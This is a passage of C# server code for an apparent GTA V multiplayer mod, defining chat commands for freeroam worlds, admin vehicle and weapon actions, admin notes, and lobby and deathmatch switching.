        [Command("world", "!{#AFAFAF}[USAGE] world (number/id, 0 is default)")]
        public void cmd_world(Player player, int worldid)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (player.GetSharedData<int>("InLobby") != -3)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not in freeroam!");
                return;
            }

            if (worldid < 0 || worldid > 256)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}The world ID can only be between 0-256! (0 is default)");
                return;
            }

            // try { Main.Log("freeroam.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:world:{worldid}"); } catch { }

            player.Dimension = (uint)256 + (uint)worldid;
            player.SetData("FreeroamWorld", (uint)worldid);

            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You have changed your freeroam world to " + worldid.ToString() + ".");

            if (worldid > 0)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You can use /gun in this freeroam world.");
            }
            else if (worldid <= 0)
            {
                player.RemoveAllWeapons();
            }
            return;
        }

        [Command("givegunall", "!{#AFAFAF}[USAGE] givegunall (ammo) (wep)", GreedyArg = true)]
        public void cmd_givegunall(Player player, int ammo, string wep)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 3)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not a level 3 admin.");
                return;
            }


            Int64 wephash = 0;
            bool found = false;
            string wepname = "";

            if (!Int64.TryParse(wep, out wephash))
            {
                wephash = 0;
            }

            foreach (KeyValuePair<long, jWeaponData> i in Settings.WeaponData)
            {
                if (wephash != 0)
                {
                    if (i.Key == wephash)
                    {
                        found = true;
                        wepname = i.Value.Name;
                    }
                }
                else
                {
                    if (!found)
                    {
                        if (i.Value.Name.Contains(wep, StringComparison.CurrentCultureIgnoreCase))
                        {
                            found = true;
                            wephash = i.Key;
                            wepname = i.Value.Name;
                        }
                    }
                    if (i.Value.Name.Equals(wep, StringComparison.CurrentCultureIgnoreCase)) // If it's really equal then override old found
                    {
                        found = true;
                        wephash = i.Key;
                        wepname = i.Value.Name;
                    }
                }
            }

            foreach (KeyValuePair<long, string> i in Main.WeaponReasons)
            {
                if (wephash != 0)
                {
                    if (i.Key == wephash)
                    {
                        found = true;
                        wepname = i.Value;
                    }
                }
                else
                {
                    if (i.Value.Contains(wep, StringComparison.CurrentCultureIgnoreCase))
                    {
                        found = true;
                        wephash = i.Key;
                        wepname = i.Value;
                    }
                }
            }


            if (found == false)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Invalid weapon! Try using hashes or exact names.");
                return;
            }

            foreach (Player target in Settings.LoggedInPlayers)
            {
                target.GiveWeapon((WeaponHash)wephash, ammo);

                if (EPlayer.GetAccount(target).WeaponComponents != null && EPlayer.GetAccount(target).WeaponComponents.Length > 3)
                {
                    Dictionary<long, wComponentData> weaponCompsData = new Dictionary<long, wComponentData>();
                    weaponCompsData = NAPI.Util.FromJson<Dictionary<long, wComponentData>>(EPlayer.GetAccount(target).WeaponComponents);

                    foreach (KeyValuePair<long, wComponentData> i in weaponCompsData)
                    {
                        if (target.GetWeaponAmmo((WeaponHash)i.Key) > 0)
                        {
                            i.Value.Components.ForEach((long comphash) =>
                            {
                                EPlayer.AttachComponent(target, i.Key, comphash);
                            });
                        }
                    }
                }
            }

            // try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:givegunall:{wepname}:{ammo}"); } catch { }
            Logs.LogAdmin(player, $"Gave all players a {wepname} with {ammo} ammo.");
            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You have given a " + wepname + " with " + ammo + " ammo to the all players.");
            return;
        }

        [Command("fix", Alias = "repair")]
        public void cmd_fix(Player player)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (player.GetSharedData<int>("InLobby") != -3 || player.Dimension < 256 || player.Dimension > 512)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not in freeroam!");
                return;
            }

            if (!player.IsInVehicle)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not in any vehicle!");
                return;
            }

            player.Vehicle.Repair();
            player.TriggerEvent("pushMsgToChat", "!{#00FF00}[>] ~w~Vehicle repaired!");
        }

        [Command("afix", "!{#AFAFAF}[USAGE] afix (target)")]
        public void cmd_afix(Player player, Player target)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not a level 1 admin.");
                return;
            }

            if (!target.IsInVehicle) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target is not in any vehicle!"); return; }

            // try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:fix:{target.Name}"); } catch { }

            target.Vehicle.Repair();

            Logs.LogAdmin(player, $"Fixed player {target.Name}'s vehicle.");
            EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} has repaired {target.Name}'s vehicle.");

            return;
        }

        [Command("flip")]
        public void cmd_flip(Player player)
        {
            player.TriggerEvent("pushMsgToChat", "bruh just flip the car yourself??");
            player.TriggerEvent("pushMsgToChat", "u literally in gta 5 not san andreas dumbo");
        }

        [Command("aflip", "!{#AFAFAF}[USAGE] aflip (target)")]
        public void cmd_aflip(Player player, Player target)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not a level 1 admin.");
                return;
            }

            if (!target.IsInVehicle) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target is not in any vehicle!"); return; }

            // try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:flip:{target.Name}"); } catch { }

            target.Vehicle.Rotation = new Vector3(0, target.Vehicle.Rotation.Y, target.Vehicle.Rotation.Z);

            Logs.LogAdmin(player, $"Fliped {target.Name}'s vehicle.");
            EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} has flipped {target.Name}'s vehicle.");

            return;
        }

        [Command("removeavehs")]
        public void cmd_removeavehs(Player player)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }

            for (int i = Settings.AdminVehicles.Count - 1; i >= 0; i--)
            {
                if (!Settings.AdminVehicles[i].IsNull && Settings.AdminVehicles[i] != null)
                {
                    Settings.AdminVehicles[i].Delete();
                    Settings.AdminVehicles.RemoveAt(i);
                }
            }

            Settings.AdminVehicles.Clear();
            EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} removed all spawned admin vehicles.");
            return;
        }

        [Command("autojoin")]
        public void cmd_autojoin(Player player)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (player.GetSharedData<int>("InLobby") == -5) return;

            if (EPlayer.GetAccount(player).JailTime > 0)
            {
                player.SetSharedData("AutoJoin", false);
                player.TriggerEvent("pushMsgToChat", "You are in jail!");
                return;
            }

            if (player.GetSharedData<bool>("AutoJoin") == true)
            {
                EPlayer.Notify(player, $"AutoJoin has been turned <strong>OFF</strong>.", "red", "fas fa-check", false, 1500, "bottomCenter", "replace");
                player.SetSharedData("AutoJoin", false);
            }
            else
            {
                EPlayer.Notify(player, $"AutoJoin has been turned <strong>ON</strong>.", "green", "fas fa-check", false, 1500, "bottomCenter", "replace");
                player.SetSharedData("AutoJoin", true);
            }
        }

        [Command("driveby", Alias = "db")]
        public void cmd_driveby(Player player)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (player.GetSharedData<bool>("WantsDriveby") == true)
            {
                if (player.GetSharedData<int>("Team") == 0 && player.IsInVehicle && player.VehicleSeat == 0)
                {
                    foreach (Player p in Settings.LoggedInPlayers.Where(a => a.Vehicle == player.Vehicle && a != player))
                    {
                        //p.TriggerEvent("pushMsgToChat", "!{#FF6347}[!!] !{#FFFFFF}" + player.Name + " has disabled drive-by in this vehicle."); ALREADY SHOWED CLIENTSIDE
                    }
                }
                player.SetSharedData("WantsDriveby", false);
                player.TriggerEvent("pushMsgToChat", "!{#33C446}[#] !{#FFFFFF}You have disabled drive-by in your vehicle. (Only takes effect as a fugitive driver)");
            }
            else
            {
                if (player.GetSharedData<int>("Team") == 0 && player.IsInVehicle && player.VehicleSeat == 0)
                {
                    foreach (Player p in Settings.LoggedInPlayers.Where(a => a.Vehicle == player.Vehicle && a != player))
                    {
                        p.TriggerEvent("pushMsgToChat", "!{#33C446}[!!] !{#FFFFFF}" + player.Name + " has enabled drive-by in this vehicle. You may shoot again.");
                    }
                }
                player.TriggerEvent("pushMsgToChat", "!{#33C446}[#] !{#FFFFFF}You have enabled drive-by in your vehicle again. (Only takes effect as a fugitive driver)");
                player.SetSharedData("WantsDriveby", true);
            }
        }

        [Command("stats")]
        public void cmd_stats(Player player)
        {
            if (!EPlayer.LoggedIn(player)) return;

            EPlayer.ShowStats(player, EPlayer.GetAccount(player));
            return;
        }

        [Command("checkstats")]
        public void cmd_checkstats(Player player, Player target)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 2)
                return;

            if (!EPlayer.LoggedIn(target))
                return;

            EPlayer.ShowStats(player, EPlayer.GetAccount(target));

            Logs.LogAdmin(player, $"Checked {target.Name}'s stats.");
            // try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:checkstats:{target.Name}"); } catch { }
            return;
        }

        [Command("gethp", Alias = "checkhp,getar,checkar,getarmour,getarmor")]
        public void cmd_checkar(Player player, Player target)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 1)
                return;

            player.TriggerEvent("pushMsgToChat", $"!{{#FFFFFF}}{target.Name}'s HP: !{{#FF6347}}{target.Health} !{{#FFFFFF}}Armour: !{{#FF6347}}{target.Armor}");
            return;
        }

        [Command("getfps")]
        public void cmd_checkfps(Player player, Player target)
        {
            if (!EPlayer.LoggedIn(player)) return;

            if (EPlayer.GetAccount(player).Admin < 1)
                return;

            player.TriggerEvent("pushMsgToChat", $"!{{#FFFFFF}}{target.Name}'s framerate is !{{#FF6347}}{target.GetSharedData<int>("FPS")}");
            return;
        }

        [Command("pos")]
        public void cmd_poslog(Player player)
        {
            if (!player.IsInVehicle)
            {
                player.TriggerEvent("pushMsgToChat", $"X: {player.Position.X} - Y: {player.Position.Y} - Z: {player.Position.Z}");
                player.TriggerEvent("pushMsgToChat", $"Heading: {player.Heading}");
                NAPI.Util.ConsoleOutput($"{player.Name} Position log: {{ new Vector3({player.Position.X}f, {player.Position.Y}f, {player.Position.Z}f), {player.Heading}f }},");
            }
            else
            {
                player.TriggerEvent("pushMsgToChat", $"vX: {player.Vehicle.Position.X} - vY: {player.Vehicle.Position.Y} - vZ: {player.Vehicle.Position.Z}");
                player.TriggerEvent("pushMsgToChat", $"vHeading: {player.Vehicle.Heading}");
                NAPI.Util.ConsoleOutput($"{player.Name} Position log: {{ new Vector3({player.Vehicle.Position.X}f, {player.Vehicle.Position.Y}f, {player.Vehicle.Position.Z}f), {player.Vehicle.Heading}f }},");
            }
        }

        [Command("voicemode")]
        public void cmd_voicemode(Player player)
        {
            Events.OnScriptedKeyPress(player, 0x09, true);
            return;
        }

        [Command("voiceblock", "!{#AFAFAF}[USAGE] voiceblock (target)", GreedyArg = true)]
        public void cmd_vblock(Player player, Player target)
        {
            if (player.HasData($"VoiceMute{target.Name}"))
            {
                player.ResetData($"VoiceMute{target.Name}");
                player.TriggerEvent("pushMsgToChat", $"!{{#33C446}}[#] !{{#FFFFFF}}You have unmuted {target.Name} on voice chat.");
            }
            else
            {
                player.SetData($"VoiceMute{target.Name}", true);
                player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}[!] !{{#FFFFFF}}You have muted {target.Name} on voice chat, use this command again to unmute them.");
            }
            return;
        }

        [Command("kill")]
        public static void cmd_kill(Player player)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (player.GetSharedData<int>("InLobby") == -5) return;

            if (player.HasData("Spectating"))
            {
                cmd_specoff(player);
            }

            if (player.Health == 0 || player.Dead)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are respawning!");
                EPlayer.Notify(player, "Please wait to respawn.", "red", "fas fa-ban", false, 1000, "bottomCenter", "replace");
                return;
            }

            player.Health = 0;
            return;
        }

        [Command("lobby")]
        public static void cmd_lobby(Player player)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (player.GetSharedData<int>("InLobby") == -5) return;

            if (!player.HasData("DMLobbySkipID"))
            {
                if (!player.HasData("LastLobbySwitch"))
                {
                    player.SetData<long>("LastLobbySwitch", Environment.TickCount64);
                }
                else
                {
                    if (Environment.TickCount64 - player.GetData<long>("LastLobbySwitch") < 1000)
                    {
                        player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot enter lobbies that fast.");
                        EPlayer.Notify(player, "Please don't repeatedly join lobby.", "red", "fas fa-lock", false, 1000, "bottomCenter", "replace");
                        return;
                    }
                }
            }

            if (player.HasData("Spectating"))
            {
                cmd_specoff(player);
            }

            if (player.HasData("DerbyVehicle"))
            {
                try { player.GetData<Vehicle>("DerbyVehicle").Delete(); }
                catch { }

                player.ResetData("DerbyVehicle");
            }

            if (player.Health == 0 || player.Dead) {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are respawning!");
                EPlayer.Notify(player, "Please wait to respawn.", "red", "fas fa-ban", false, 1000, "bottomCenter", "replace");
                return;
            }

            List<Vehicle> freeroamVehs = new List<Vehicle>();
            freeroamVehs = player.GetData<List<Vehicle>>("FreeroamVehicles");

            for (int i = freeroamVehs.Count - 1; i >= 0; i--)
            {
                if (!freeroamVehs[i].IsNull && freeroamVehs[i] != null)
                {
                    freeroamVehs[i].Delete();
                    freeroamVehs.RemoveAt(i);
                }
            }

            if (freeroamVehs.Count > 0)
            {
                for (int i = 0; i < freeroamVehs.Count; i++)
                {
                    freeroamVehs.RemoveAt(i);
                }
            }

            if (!player.HasData("ForcedData"))
            {
                // Do lobby checks here so /sendtolobby ignores all of them.
                // like ingame etc so you cant lobby midgame or some stuff like that you get it?
                // not really needed for ingame but other stuff
            }

            LobbyData elobby = Settings.Lobbies.Find(a => a.lobbyId == player.GetSharedData<int>("InLobby"));
            if (elobby != null)
            {
                if (elobby.gameStatus == 1 && (elobby.Cops.Contains(player) || elobby.Fugitives.Contains(player)))
                {
                    if (elobby.Fugitives.Contains(player) && !player.GetSharedData<string>("CuffedBy").Equals("n/a"))
                    {
                        player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are currently being cuffed, mate.");
                        return;
                    }
                    player.Health = 0;
                    return;
                }
            }

            if (player.GetSharedData<int>("InDM") != -1)
            {
                player.TriggerEvent("ResetKillFeed");
            }

            freeroamVehs.Clear();
            player.SetData("FreeroamVehicles", freeroamVehs);
            player.SetSharedData("InDM", -1);
            player.ResetData("ForcedData");

            EPlayer.Save(player, true);

            player.SetSharedData("HeistLeader", false);
            player.TriggerEvent("BankRob_ClearFugiCarBlips");
            player.TriggerEvent("BankRob_ClearFinishMarker");

            if (elobby == null) player.SetSharedData("InLobby", -1);

            EPlayer.Spawn(player);
            EPlayer.Notify(player, $"Joined <strong>Lobby</strong>", "blue", "fas fa-users", false, 1000, "bottomCenter", "replace");
            player.SetData<long>("LastLobbySwitch", Environment.TickCount64);
            return;
        }

        [Command("mylobby")]
        public void cmd_mylobby(Player player)
        {
            if (!EPlayer.LoggedIn(player))
                return;


            player.TriggerEvent("pushMsgToChat", $"!{{#FFFF00}}You are in lobby {player.GetSharedData<int>("InLobby")}, /switchlobby to change to another lobby.");

            player.TriggerEvent("pushMsgToChat", "Current Lobby Players:");
            Settings.LoggedInPlayers.Where(a => a.GetSharedData<int>("InLobby") == player.GetSharedData<int>("InLobby")).ToList().ForEach((Player ePlayer) =>
            {
                player.TriggerEvent("pushMsgToChat", $"!{{#999999}}{ePlayer.Name}");
            });

            return;
        }

        [Command("clientcmd", Alias = "pagesize,updaterate,lcmenu,fontsize,rappel,rapple,voicebind,noclip_vsm,autoooc,gpsbind,bigmap,bigmapbind", GreedyArg = true)] // It's a client-side command we're adding here just so it doesn't show "invalid command" when triggered.
        public void cmd_clientcmd(Player player)
        {
            return;
        }

        [Command("packetloss", Alias = "pl,ploss")]
        public void cmd_packetloss(Player player, Player target)
        {
            player.TriggerEvent("pushMsgToChat", $"{target.Name}'s packetloss is !{{#FF6347}}{Convert.ToDouble(target.GetSharedData<object>("Packetloss")).ToString("N2")}%");
            return;
        }

        [Command("restartmenu")]
        public void cmd_restartmenu(Player player)
        {
            player.TriggerEvent("RestartMenu");
            return;
        }

        [Command("anotes", "!{#AFAFAF}[USAGE] anote (target) [add|view|delete]", Alias = "anote", GreedyArg = true)]
        public void cmd_anote(Player player, Player target, string arg)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You do not have permission to use this command!");
                return;
            }
            if (EPlayer.GetAccount(target).Admin > EPlayer.GetAccount(player).Admin)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target is higher admin level than you!");
                return;
            }

            string option = (arg.Contains(' ') ? arg.Split(' ')[0] : arg);
            switch (option)
            {
                case "view":
                    {
                        EPlayer.ShowAdminNotes(player, EPlayer.GetAccount(target), AdminNote.ANoteType.None); //none = no specific note type | shows all notes
                        Logs.LogAdmin(player, $"Attempted to view {target.Name}'s admin notes.");
                        break;
                    }
                case "add":
                    {
                        string[] args = arg.Split(' ');
                        if (args.Length < 3)
                        {
                            player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}[USAGE] anote add [type: none, connect, spectate, both](text)");
                            return;
                        }
                        AdminNote.ANoteType type = AdminNote.ANoteType.None;
                        switch (args[1])
                        {
                            case "none":
                                type = AdminNote.ANoteType.None;
                                break;
                            case "connect":
                                type = AdminNote.ANoteType.OnConnect;
                                break;
                            case "spectate":
                                type = AdminNote.ANoteType.OnSpectate;
                                break;
                            case "both":
                                type = AdminNote.ANoteType.Both;
                                break;
                            default:
                                {
                                    player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}[USAGE] anote add !{#FF6347}[type: none, connect, spectate, both]!{#AFAFAF}(text)");
                                    return;
                                }
                        }
                        string text = arg.Substring(arg.IndexOf(args[1]) + args[1].Length); // dont even ask pro maths 😎
                        if (text.Length < 5)
                        {
                            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Note text should have more than 5 characters!");
                            return;
                        }

                        AdminNote _n = new AdminNote()
                        {
                            AccountID = EPlayer.GetAccount(target).SQL_ID,
                            AdminID = EPlayer.GetAccount(player).SQL_ID,
                            Text = text,
                            Timestamp = DateTime.Now.ToShortDateString(),
                            Type = type
                        };

                        player.TriggerEvent("pushMsgToChat", $"!{{#72ff6b}}Successfully added admin note to {target.Name} ({text})!");
                        Logs.LogAdmin(player, $"Added admin note to {target.Name} of type {_n.TypeToString()} at {_n.Timestamp}");
                        Task.Run(async () =>
                        {
                            using (MainDatabase context = ContextFactory.CreateContext())
                            {
                                await context.AdminNotes.AddAsync(_n);
                                await context.SaveChangesAsync();
                            }
                        });
                        break;
                    }
                case "delete":
                    {
                        string[] args = arg.Split(' ');
                        if (args.Length < 2)
                        {
                            player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}[USAGE] anote delete (Note ID | use 'view' to check)");
                            return;
                        }
                        int nID = -1;
                        try
                        {
                            nID = int.Parse(args[1]);
                        }
                        catch
                        {
                            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Note ID must be a number! Use /anote view to check IDs.");
                            return;
                        };
                        EPlayer.SendMessage(player, "~y~Executing, please wait...");

                        Task.Run(async () =>
                        {
                            using (MainDatabase context = ContextFactory.CreateContext())
                            {
                                AdminNote _n = await context.AdminNotes.AsQueryable().FirstOrDefaultAsync(a => a.SQL_ID == nID);
                                anote_OnFindDeleteNote(player, _n, nID, target);
                            }
                        });
                        break;
                    }
                default:
                    {
                        player.TriggerEvent("pushMsgToChat", "!{#AFAFAF}[USAGE] anote (target) [add|view|delete]");
                        return;
                    }
            }
        }
        private void anote_OnFindDeleteNote(Player player, AdminNote _n, int nID, Player target)
        {
            NAPI.Task.Run(() =>
            {
                if (_n == null)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}A note with that ID could not be found!");
                    return;
                }
                if (_n.AccountID != EPlayer.GetAccount(target).SQL_ID)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}The note ID you specified does not match any of target's notes.");
                    player.TriggerEvent("pushMsgToChat", $"!{{#C9C9C9}}[TIP] Use /anote {target.Name} view to check their note IDs.");
                    return;
                }


                Task.Run(async () =>
                {
                    using (MainDatabase context = ContextFactory.CreateContext())
                    {
                        Account tAcc = await context.Accounts.AsQueryable().FirstOrDefaultAsync(a => a.SQL_ID == _n.AccountID);
                        context.AdminNotes.Remove(_n);
                        string nTargetName = tAcc.Username ?? "[Unknown]";
                        anote_FinishDeleteNote(player, nID, nTargetName);
                    }
                });
            });
        }
        private void anote_FinishDeleteNote(Player player, int nID, string nTargetName)
        {
            NAPI.Task.Run(() =>
            {
                player.TriggerEvent("pushMsgToChat", $"!{{#72ff6b}}You deleted admin {nTargetName}'s admin note with ID {nID}");
                Logs.LogAdmin(player, $"Deleted {nTargetName}'s admin note ID {nID}.");
            });
        }


        [Command("lobbies")]
        public void cmd_lobbies(Player player)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            List<LobbyData> lobbyList = Settings.Lobbies.ToList();
            string enabledStr = "";
            foreach (LobbyData lobby in lobbyList)
            {
                if (lobby.Enabled)
                {
                    if (lobby.Password.Length > 1 && lobby.PlayerCreated)
                    {
                        enabledStr = "!{#FF6347}PASSWORD/LOCKED";
                    }
                    else enabledStr = "!{#00FF33}ENABLED";
                }
                else
                {
                    enabledStr = "!{#FF0000}DISABLED";
                }

                player.TriggerEvent("pushMsgToChat", $">> !{{#DAA520}}Lobby {lobby.lobbyId} | {enabledStr} " +
                    $"!{{#DAA520}}| Players: !{{#FFFFFF}}" +
                    $"{Settings.LoggedInPlayers.Count(a => a.GetSharedData<int>("InLobby") == lobby.lobbyId)}!{{#DAA520}}/!{{#FFFFFF}}{Settings.Dynamics.MaxInLobby} !{{#DAA520}}| Status: {Main.ConvertGameStatus(lobby.gameStatus, true)} !{{#DAA520}}| Mode: {Main.ConvertGameMode(lobby.gameMode, true)}!{{#DAA520}}");
            }

            return;
        }

        [Command("switchlobby", "!{#AFAFAF}[USAGE] switchlobby (lobbyid) (optional: password)", Alias = "swl", GreedyArg = true)]
        public static void cmd_switchlobby(Player player, string args)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (player.GetSharedData<int>("InLobby") == -5) return;

            if (player.GetData<int>("JailTime") > 0)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are in jail!");
                EPlayer.Notify(player, "You are currently jailed.", "red", "fas fa-lock", false, 1000, "bottomCenter", "replace");
                return;
            }

            if (!player.HasData("DMLobbySkipID"))
            {
                if (!player.HasData("LastLobbySwitch"))
                {
                    player.SetData<long>("LastLobbySwitch", Environment.TickCount64);
                }
                else
                {
                    if (Environment.TickCount64 - player.GetData<long>("LastLobbySwitch") < 1000)
                    {
                        player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot switch lobbies that fast.");
                        EPlayer.Notify(player, "Please don't spam join lobby.", "red", "fas fa-lock", false, 1000, "bottomCenter", "replace");
                        return;
                    }
                }
            }

            int lobbyid = 0;
            string password = "";

            string[] split = args.Split(' ');
            if (split.Count() > 0)
            {
                if (!Int32.TryParse(split[0], out lobbyid) || lobbyid < 1)
                {
                    player.TriggerEvent("pushMsgToChat", $"!{{#999999}}Lobby ID cannot be less than 1!");
                    return;
                }
            }

            if (split.Count() > 1)
            {
                password = split[1];
            }


            LobbyData lobby = Settings.Lobbies.Find(a => a.lobbyId == lobbyid);
            if ((lobby != null) == false)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Invalid lobby id!");
                EPlayer.Notify(player, "Invalid lobby.", "red", "fas fa-lock", false, 1000, "bottomCenter", "replace");
                return;
            }

            if (!lobby.Enabled)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Lobby is disabled!");
                EPlayer.Notify(player, "Lobby is disabled.", "red", "fas fa-lock", false, 1000, "bottomCenter", "replace");
                return;
            }

            if (lobby.Password.Length > 1 && EPlayer.GetAccount(player).Admin < 1)
            {
                if (password.Length < 1)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}This lobby has a password, join with /swl (lobby id) (password).");
                    EPlayer.Notify(player, "Lobby requires a password.", "red", "fas fa-lock", false, 1000, "bottomCenter", "replace");
                    return;
                }

                if (!password.Equals(lobby.Password))
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Invalid password for the lobby!");
                    EPlayer.Notify(player, "Invalid password.", "red", "fas fa-lock", false, 1000, "bottomCenter", "replace");
                    return;
                }
            }

            if (Settings.LoggedInPlayers.Count(a => a.GetSharedData<int>("InLobby") == lobbyid) >= Settings.Dynamics.MaxInLobby && EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}That lobby is full!");
                EPlayer.Notify(player, "Lobby is full.", "red", "fas fa-lock", false, 1000, "bottomCenter", "replace");
                return;
            }

            LobbyData elobby = Settings.Lobbies.Find(a => a.lobbyId == player.GetSharedData<int>("InLobby"));
            if (elobby != null)
            {
                if (elobby.gameStatus == 1 && (elobby.Cops.Contains(player) || elobby.Fugitives.Contains(player)))
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot switch lobbies in an ongoing game! (/lobby)");
                    EPlayer.Notify(player, "You are currently in an ongoing game.", "red", "fas fa-lock", false, 1000, "bottomCenter", "replace");
                    return;
                }
            }

            player.SetData("LastLobbySwitch", Environment.TickCount64);
            foreach (Player targ in Settings.LoggedInPlayers.Where(a => a.GetSharedData<int>("InLobby") == lobbyid && a.Id != player.Id))
            {
                //targ.TriggerEvent("pushMsgToChat", $"[Lobby {lobbyid}] {player.Name} has joined this lobby.");
                EPlayer.Notify(targ, $"<strong>{player.Name}</strong> joined the lobby", "blue", "fas fa-user-plus", false, 1000);
            }

            player.SetSharedData("InLobby", lobbyid);

            NAPI.Player.SpawnPlayer(player, Settings.LobbySpawns.OrderBy(c => Guid.NewGuid()).First());
            EPlayer.Notify(player, $"Joined <strong>Lobby {lobbyid}</strong>", "blue", "fas fa-users", false, 1000, "bottomCenter", "replace");
            return;
        }

        [Command("dmarenas")]
        public void cmd_dmarenas(Player player)
        {
            if (!EPlayer.LoggedIn(player)) return;


            for (int i = 0; i < Settings.DMNames.Length; i++)
            {
                if (player.GetSharedData<int>("InLobby") <= -1)
                {
                    player.TriggerEvent("pushMsgToChat", $">> !{{#DAA520}}Arena ID {i} | !{{#FF6347}}{Settings.DMNames[i]} " +
                           $"!{{#DAA520}}| Players: N/A (No lobby)");
                }
                else
                {
                    player.TriggerEvent("pushMsgToChat", $">> !{{#DAA520}}Arena ID {i} | !{{#FF6347}}{Settings.DMNames[i]} " +
                       $"!{{#DAA520}}| Players: !{{#FFFFFF}}{Settings.LoggedInPlayers.Count(a => a.GetSharedData<int>("InLobby") == player.GetSharedData<int>("InLobby") && a.GetSharedData<int>("InDM") == i)}!{{#DAA520}}/!{{#FFFFFF}}{7 + (Settings.LoggedInPlayers.Count(a => a.GetSharedData<int>("InLobby") == player.GetSharedData<int>("InLobby")) / 3)}");
                }
            }

            return;
        }

        [Command("realmendm", "!{#AFAFAF}[USAGE] realmendm (arenaid) (teamid)")]
        public static void cmd_realmendm(Player player, int arenaid, int teamid)
        {
            if (arenaid == 666) return;
            if (!EPlayer.LoggedIn(player)) return;
            if (EPlayer.GetAccount(player).JailTime > 0) return;

            if (player.HasData("Spectating"))
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are in spectate mode!");
                EPlayer.Notify(player, "You are currently spectating.", "red", "fas fa-lock", false, 1000, "bottomCenter", "replace");
                return;
            }

            if (player.GetSharedData<int>("Team") != -1 && player.GetSharedData<int>("InLobby") != -6)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are currently in the copchase!");
                EPlayer.Notify(player, "You are in a copchase.", "red", "fas fa-lock", false, 1000, "bottomCenter", "replace");
                return;
            }

            Task.Run(async () =>
            {
                var arena = await EPlayer.IsValidDMArena(arenaid);
                if (arena.Value == false)
                {
                    NAPI.Task.Run(() =>
                    {
